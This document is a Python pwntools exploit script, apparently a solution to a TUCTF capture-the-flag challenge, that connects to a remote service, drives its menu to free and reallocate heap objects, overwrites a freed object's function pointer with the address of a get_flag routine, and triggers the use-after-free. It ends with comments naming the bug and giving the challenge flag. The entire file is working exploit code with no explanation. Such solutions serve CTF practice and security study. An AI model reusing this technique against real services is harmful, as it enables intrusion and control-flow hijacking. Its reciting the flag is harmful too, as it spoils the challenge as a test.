from pwn import *

context(log_level='debug')
get_flag = 0x0040090D

# p = process('./pwn2')
p = remote('104.155.227.252',25050)

p.recvuntil('our choice:\n')
p.sendline('3')
p.recvuntil('Brown Bear\n')
p.sendline('3')
p.recvuntil(' name:\n')
p.sendline('aaaa')

p.recvuntil('our choice:\n')
p.sendline('3')
p.recvuntil('Brown Bear\n')
p.sendline('3')
p.recvuntil(' name:\n')
p.sendline('aaaa')


# gdb.attach(p,'b*0x400CF1\nc')

p.recvuntil('our choice:\n')
p.sendline('4')
p.recvuntil('want to delete?\n')
p.sendline('1')


p.recvuntil('our choice:\n')
p.sendline('2')
p.recvuntil('pian Tiger\n')
p.sendline('3')
p.recvuntil('of tiger:')
p.sendline(p64(get_flag))

p.recvuntil('our choice:\n')
p.sendline('4919')

p.interactive()

#UAF
#TUCTF{free_as_in_freedom_I_mean_Use_after_free}